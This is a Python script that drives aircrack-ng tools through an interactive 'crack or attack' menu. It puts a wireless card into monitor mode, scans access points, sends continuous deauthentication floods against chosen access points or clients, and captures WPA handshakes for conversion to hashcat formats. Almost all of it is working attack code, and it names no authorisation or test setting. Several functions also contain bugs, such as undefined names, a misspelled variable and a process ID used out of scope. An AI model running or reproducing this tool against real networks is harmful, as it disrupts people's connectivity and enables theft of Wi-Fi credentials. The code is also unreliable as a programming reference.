import os
import subprocess
import time
import csv
import sys
import re
from pathlib import Path
OUTPUT_FILE = "/tmp/airodump_full_output"

def check_req():
	try:
		for cmd in ["aircrack-ng", "iwconfig", "systemctl","kitty" ,"cp"]:
			result = subprocess.run(["which", cmd], capture_output=True, text=True)
			if result.returncode != 0:
				print("sorry I tried to terminal-less, its making the code too complex and unnecessary... if the issue is kitty not installed...")
				print(f"Error: {cmd} is not installed or not in your PATH.")
				sys.exit(1)
		print("All required tools are installed.")
	except Exception as e:
		print(f"An error occurred while checking for requirements: {e}")
		sys.exit(1)

def validate_monitor_mode(interface):
	result = subprocess.run(["iwconfig"], capture_output=True, text=True)
	if f"{interface}mon" in result.stdout:
		print(f"Monitor mode enabled on {interface}mon")
		return f"{interface}mon"
	else:
		print(f"Failed to enable monitor mode on {interface}. Check your setup.")
		return None

def cleanup(airodump_pid, interface):
	print("\nCleaning up...")
	if airodump_pid:
		print(f"Stopping airodump-ng (PID {airodump_pid})...")
		os.kill(airodump_pid, 9)
	if interface:
		disable_monitor_mode(interface)
	print("Restarting NetworkManager...")
	os.system("sudo systemctl start NetworkManager")
	if Path(f"{OUTPUT_FILE}-01.csv").exists():
		print(f"Removing output file {OUTPUT_FILE}-01.csv...")
		os.remove(f"{OUTPUT_FILE}-01.csv")


def get_iwconfig():
	try:
		result = subprocess.run(
			["iwconfig"],
			stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		)
		if result.returncode != 0:
			print(f"Error getting iwconfig output: {result.stderr}")
		return result.stdout
	except Exception as e:
		print(f"An error occurred while fetching iwconfig: {e}")
		return None

def enable_monitor_mode(interface):
	try:
		print("iwconfig before enabling monitor mode:")
		iwconfig_before = get_iwconfig()
		print(iwconfig_before)
		print("Killing interfering processes...")
		result = subprocess.run(
			["sudo", "airmon-ng", "check", "kill"],
			stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		)
		if result.returncode != 0:
			print(f"Error stopping interfering processes: {result.stderr}")
			return None
		print(f"Starting monitor mode on {interface}...")
		result = subprocess.run(
			["sudo", "airmon-ng", "start", interface],
			stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
		)
		if result.returncode != 0:
			print(f"Error setting {interface} to monitor mode: {result.stderr}")
			return None
		time.sleep(2)
		print("iwconfig after enabling monitor mode:")
		iwconfig_after = get_iwconfig()
		print(iwconfig_after)
		print(f"Which interface is in monitor mode? (Choose one: {interface} or another if necessary)")
		mon_interface = input("Enter the interface in monitor mode: ")
		return mon_interface

	except Exception as e:
		print(f"An error occurred: {e}")
		return None



def disable_monitor_mode(interface):
	print(f"Disabling monitor mode on {interface}...")
	try:
		subprocess.run(
			["sudo", "airmon-ng", "stop", interface], capture_output=True, text=True, check=True
		)
		print(f"Monitor mode disabled on {interface}.")
	except subprocess.CalledProcessError as e:
		print(f"Error occurred while disabling monitor mode: {e}")

def startup(interface):
	print("Killing interfering processes...")
	os.system("sudo airmon-ng check kill")

	print(f"\nStarting monitor mode on {interface}...")
	return enable_monitor_mode(interface)

def kill(airodump_pid):
	try:
		print("\nKilling...")
		print(f"Stopping process with PID {airodump_pid}...")
		os.kill(airodump_pid, 9)  # 9 is SIGKILL to forcefully terminate the process
	except ProcessLookupError:
		print(f"\nNo process found with PID {airodump_pid}. It may have already terminated.")
	except Exception as e:
		print(f"\nAn error occurred while trying to kill the process: {e}")
	
def display_table(file_path):
	try:
		os.system('clear')
		with open(file_path, 'r') as f:
			reader = csv.reader(f)
			rows = list(reader)
			if len(rows) < 2:
				sys.stdout.write("No data available yet.\n")
				sys.stdout.flush()
				return
			tables = []
			current_table = []
			for row in rows:
				if all(cell.strip() == '' for cell in row):
					if current_table:
						tables.append(current_table)
						current_table = []
				else:
					current_table.append(row)
			if current_table:
				tables.append(current_table)
			for table in tables:
				num_columns = max(len(row) for row in table)
				col_widths = [max(len(str(row[i])) if i < len(row) else 0 for row in table) for i in range(num_columns)]
				table_output = ""
				for row in table:
					row_output = " | ".join(f"{str(col):<{col_widths[i]}}" if i < len(row) else " " * col_widths[i] for i, col in enumerate(row))
					table_output += row_output + "\n"
				sys.stdout.write(table_output + "\n")
				sys.stdout.flush()
			a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
			if a in ("s", "k", "1", "stop"):
				return 0
	except FileNotFoundError:
		sys.stdout.write(f"File {file_path} not found. Waiting for data...\n")
		sys.stdout.flush()
	except Exception as e:
		sys.stdout.write(f"An error occurred while displaying the table: {e}\n")
		sys.stdout.flush()

def deauth_ap(bssid, channel, mon_interface):
	print(f"Deauthenticating AP {bssid} on channel {channel}...")
	airodump_command = [
		"sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, mon_interface
	]
	
	command_str = " ".join(airodump_command)
	print(f"Executing command: {command_str}")
	
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"airodump-ng started with PID {airodump_pid}")
	
	print(f"Switching to channel {channel}...")
	time.sleep(4)
	
	print("Killing airodump-ng and switching to deauth protocol...")
	kill(airodump_pid)
	
	airodump_command = [
		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface
	]
	command_str = " ".join(airodump_command)
	print(f"Executing command: {command_str}")
	
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"aireplay-ng started with PID {airodump_pid}")
	
	try:
		for line in iter(airodump_proc.stdout.readline, b''):
			print(line.decode('utf-8').strip())
		for line in iter(airodump_proc.stderr.readline, b''):
			print(line.decode('utf-8').strip())
		
		airodump_proc.stdout.close()
		airodump_proc.stderr.close()
		airodump_proc.wait()
		
	except KeyboardInterrupt:
		kill(airodump_pid)
		return 0
	except Exception as e:
		print(f"\nAn error occurred while executing the command: {e}")
		return 0

def deauth_client(bssid, channel, essid, mon_interface):
	print(f"Deauthenticating client {essid} on AP {bssid} at channel {channel}...")
	airodump_command = [
		"sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, mon_interface
	]
	
	command_str = " ".join(airodump_command)
	print(f"Executing command: {command_str}")
	
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"airodump-ng started with PID {airodump_pid}")
	
	print(f"Switching to channel {channel}...")
	time.sleep(4)
	
	print("Killing airodump-ng and switching to deauth protocol...")
	kill(airodump_pid)
	
	airodump_command = [
		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", essid, mon_interface
	]
	command_str = " ".join(airodump_command)
	print(f"Executing command: {command_str}")
	
	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	airodump_pid = airodump_proc.pid
	print(f"aireplay-ng started with PID {airodump_pid}")
	
	try:
		for line in iter(airodump_proc.stdout.readline, b''):
			print(line.decode('utf-8').strip())
		for line in iter(airodump_proc.stderr.readline, b''):
			print(line.decode('utf-8').strip())
		
		airodump_proc.stdout.close()
		airodump_proc.stderr.close()
		airodump_proc.wait()
		
	except KeyboardInterrupt:
		kill(airodump_pid)
		return 0
	except Exception as e:
		print(f"\nAn error occurred while executing the command: {e}")
		return 0

def clients(mon_interface, bssid, channel):
	a = input("Deauth client? (1(yes )or 2(no)): ").lower()
	if a in ("1", yes, y):
		essid = input("essid: ")
		deauth_client(bssid, channel, essid, mon_interface)
	else:
		return

def fun(mon_interface):
	while True:
		try:
			bssid = input("Your chosen BSSID: ")
			channel = input("Your chosen Channel: ")
			a = input("Deauth the whole AP or Keep Dumping specific AP? (1 or 2) (q to quit)")
			if a == "1":
				if deauth_ap(bssid, channel, mon_interface) == 0:
					os.kill(airodump_pid, 9)
					print("quitting...")
			elif a == "2":
				if Path(f"{OUTPUT_FILE}-01.csv").exists():
					print(f"Removing output file {OUTPUT_FILE}-01.csv...")
					os.remove(f"{OUTPUT_FILE}-01.csv")
				airodump_command = [
					"sudo", "airodump-ng", "--manufacturer","--uptime", "--wps", "--beacons", "--band", "abg", "--bssid", bssid, "--channel", channel, mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv", "--write-interval", "1"
				]
				print(f"Executing {airodump_command}")
				airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				airodump_pid = airodump_proc.pid
				print(f"airodump-ng started with PID {airodump_pid}")
				command_str = " ".join(airodump_command)
				print(f"Executed: {command_str}")
				print(f"Waiting for output file {OUTPUT_FILE}-01.csv to be created...")
				retries = 0
				while not Path(f"{OUTPUT_FILE}-01.csv").exists() and retries < 20:
					time.sleep(1)
					retries += 1
				if not Path(f"{OUTPUT_FILE}-01.csv").exists():
					print(f"Error: Output file {OUTPUT_FILE}-01.csv not found. Exiting.")
					return
				print("Displaying live data...")
				while True:
					if display_table(f"{OUTPUT_FILE}-01.csv") == 0:
						if a in ("yes", "y", "1"):
							os.system(f"sudo cp {OUTPUT_FILE}-01.csv ~/Downloads")
						os.kill(airodump_pid, 9)
						break
				command_str = " ".join(airodump_command)
				print(f"Executed: {command_str}")
				print(f"Killed {airodump_command} command")
				print("\nCapture stopped.")
			else:
				print("nothing selected quitting...")
				
			a = input(print("Deauth a client? or quit: ")).lower()
			if a in ("yes","y", "1"):
				a = input("Launch a terminal for capturing handshake?: ").lower()
				if a in ("yes","y","1"):
					capture_handshake(bssid, channel, mon_interface)
				essid = input("essid: ")
				while True:
					if deauth_client(bssid, channel,essid,mon_interface) == 0:
						os.kill(airodump_pid, 9)
						break
				command_str = " ".join(airodump_command)
				print(f"Executed: {command_str}")
			else:
				print("quitting...")
		except Exception as e:
			print(f"Error occurred: {e}")
		finally:
			kill(airodump_pid)

def crack(mon_interface):
	try:
		bssid = input("Enter Bssid: ")
		channel = input("Channel: ")
		try:
			os.system(f"kitty -e 'bash -c \"sudo airodump-ng --bssid {bssid} --channel {channel} -w psk {mon_interface}; exec bash\"'")
		except:
			print("quitting...")
		print("converting cap to hash...")
		print("check for the location of captured cap file")
		capcture = input("captured cap file location: ")
		try:
			print("try install multicapconverter from https://github.com/s77rt/multicapconverter/tree/master \ngit clone that if not exist...")
			os.system(f"python ~/multicapconverter/multicapconverter.py -i {capture} --group-by handshake -x hccapx --all")
		except:
			print("quitting")
	except Exception as e:
		print(f"An error has occurred {e}")
	finally:
		if mon_interface:
			cleanup(airodump_pid, mon_interface)
		else:
			print("No monitor interface to cleanup.")

def capture_handshake(bssid, channel, mon_interface):
	try:
		write="~/Download"
		print("Please specify the location")
		write=input("where do you want to write the captured handshake file?(~/Download): ")
		os.system(f"kitty -e 'bash -c \"sudo airodump-ng --manufacturer --beacons --wps --band abg --bssid {bssid} --channel {channel} wlan1 --write {write} --output-format pcap; exec bash \"'")
		print(f"launcing new terminal kitty \nsudo airodump-ng --manufacturer --beacons --wps --band abg --bssid {bssid} --channel {channel} wlan1 --ivs --write {write}")
		print("Little tip:\n")
		print("r activate realtime sorting - applies sorting algorithm every time the display will be redrawn \n's' Change  column to	sort by, which currently includes: First seen; BSSID; PWR level;	Beacons; Data packets; Packet  rate;  Channel; Max. datarate; Encryption; Strongest Ciphersuite; Strongest Authentication; ESSID \n'SPACE'  Pause display redrawing/ Resume redrawing")
		print("If using pcap file to be converted to hashcat readable format try use this github repo and git clone: \nhttps://github.com/ZerBea/hcxtools\n and then interact with it... have fun!")
	except Exception as e:
		print(f"An error has occurred {e}")
	

def main():
	a = input("crack or attack: ").lower()
	airodump_pid = None
	mon_interface = None
	if a in ("attack","2"):
		try:
			os.system("iwconfig")
			interface = input("Enter the network interface (e.g., wlan0): ").strip()
			a = input("airodump or directly jump into aireplay (1 or 2): ").lower()
			if a in ("1"):
				a = input("airodump all possible ap or single ap with handshake capture? (1 or 2):").lower()
				if a in ("1","all"):
					b = input("airodump a specific client?: ")
					mon_interface = startup(interface)
					if Path(OUTPUT_FILE).exists():
						os.remove(OUTPUT_FILE)
					print(f"\nStarting airodump-ng, capturing all data to {OUTPUT_FILE}...")
					airodump_command = [
						"sudo", "airodump-ng", "--manufacturer", "--wps", "--showack", "--beacons", "--band", "abg", mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv"
					]
					if b in ("yes", "y"):
						essid = input("essid: ")
						airodump_command2 = [
						"sudo", "airodump-ng", "--manufacturer", "--wps", "--showack", "--beacons", "--band", "abg", mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv", "--essid", essid
						]
						airodump_command=airodump_command2
					print(f"Executing {airodump_command}")
					airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					airodump_pid = airodump_proc.pid
					print(f"airodump-ng started with PID {airodump_pid}")
					try:
						stdout, stderr = airodump_proc.communicate(timeout=10)
						print("\n--- Command Output ---")
						print(stdout.decode())
						if stderr.strip():
							print("\n--- Command Errors ---")
							print(stderr.decode())
					except subprocess.TimeoutExpired:
						print("\nairodump-ng is running. You can stop it anytime.")
						while True:
							if display_table(f"{OUTPUT_FILE}-01.csv") == 0:
								try:
									a = input("Save output file?: ")
									if a in ("yes", "y", "1"):
										print("saving to ~/Downloads...")
										os.system(f"sudo cp {OUTPUT_FILE}-01.csv ~/Downloads")
									else:
										print("continuing...")
								except:
									print("Error saving files")
								finally:
									kill(airodump_pid)
								break
					except Exception as e:
						print(f"Error while running airodump-ng: {e}")
					print("removing csv...")
					os.remove(f"{OUTPUT_FILE}-01.csv")
					a = input("crack or continue?: ").lower()
					if a in ("crack", "1"):
						crack(mon_interface)
					else:
						fun(mon_interface)
				elif a in ("2", "ap", "single"):
					mon_interface = startup(interface)
					bssid = input("bssid: ")
					channel = input("channel: ")
					capture_handshake(bssid, channel, mon_interface)
			elif a == "2":
				mon_interface = startup(interface)
				fun(mon_interface)
		except Exception as e:
			print(f"An error occurred: {e}")
		finally:
			if mon_interface:
				cleanup(airodump_pid, mon_interface)
			else:
				print("No monitor interface to cleanup.")
	elif a in ("crack","1"):
		print()
		os.system("iwconfig")
		interface = input("Interface converted to monitor: ")
		mon_interface = startup(interface)
		crack(mon_interface)
	else:
		print("exiting... incorrect option selected")

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\n Quitting...")
		print("Adios!")
	except Exception as e:
		print(f"An error occurred: {e}")
